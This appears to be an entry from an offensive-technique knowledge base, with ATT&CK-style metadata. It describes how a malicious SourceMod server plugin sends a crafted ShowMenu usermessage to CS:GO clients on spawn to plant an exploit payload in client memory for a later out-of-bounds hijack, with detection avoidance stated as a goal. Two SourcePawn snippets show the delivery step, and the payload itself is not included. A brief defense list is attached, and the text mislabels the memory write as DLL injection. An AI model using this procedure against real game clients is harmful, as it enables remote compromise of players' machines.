---
id: proc-source-showmenu-send
tags:
  - usermessage
  - sourcemod
  - memory-write
type: procedure
tools:
  - '[[tools/SourceMod]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Windows
  - Gaming
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Dynamic-link Library Injection]]'
updated_at: '2025-12-14T17:24:08.901Z'
skill_level: advanced
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Dynamic-link Library Injection]]'
---
# Send-Payload-via-SourceMod-ShowMenu-Message

## Summary

This procedure uses a SourceMod plugin to send a crafted ShowMenu usermessage to the client upon spawn, writing the exploit payload into controlled memory (g_szMenuString) without triggering alerts.

## Description

Hooking the player_spawn event in a SourceMod plugin allows the attacker to deliver the payload via a legitimate network message. The message sets menu_string to the UTF-16 payload, placing the fake object at g_szMenuString[512]. This exploits the trust in usermessages for menu display, enabling subsequent OOB read hijacking in CS:GO clients.

## Requirements

1. SourceMod installed on malicious server
2. Compiled plugin with payload inserted
3. Server running Source Engine game

## Defense

Defensive measures and detection strategies:

- Limit usermessage string lengths and validate content
- Log anomalous usermessage sends from plugins
- Disable or monitor custom plugins on servers

## Objectives

1. Deliver payload to client memory on spawn
2. Avoid detection via legitimate message
3. Set up for OOB trigger

## Instructions

### Step 1: Hook Spawn Event

**Context**: Create plugin to intercept client spawn.

In SourcePawn script:

```pawn
public OnClientPutInServer(client) {
    HookEvent("player_spawn", Event_PlayerSpawn);
}
public Event_PlayerSpawn(Handle:event, const String:name[], bool:dontBroadcast) {
    int client = GetClientOfUserId(GetEventInt(event, "userid"));
    // Proceed to send message
}
```

> Ensures message sent on spawn.

### Step 2: Send ShowMenu Message

**Context**: Craft and transmit the usermessage.

```pawn
Handle msg = StartMessageOne("ShowMenu", client);
PbSetInt(msg, "bits_valid_slots", 0xFFFFFFFF);
PbSetInt(msg, "display_time", 0);
PbSetString(msg, "menu_string", payload);
EndMessage();
```

> Payload written to g_szMenuString; compile to .smx.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Dynamic-link Library Injection]] Dynamic-link Library Injection (via memory write)

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/SourceMod]]

## Tags

- plugin
- usermessage
- injection
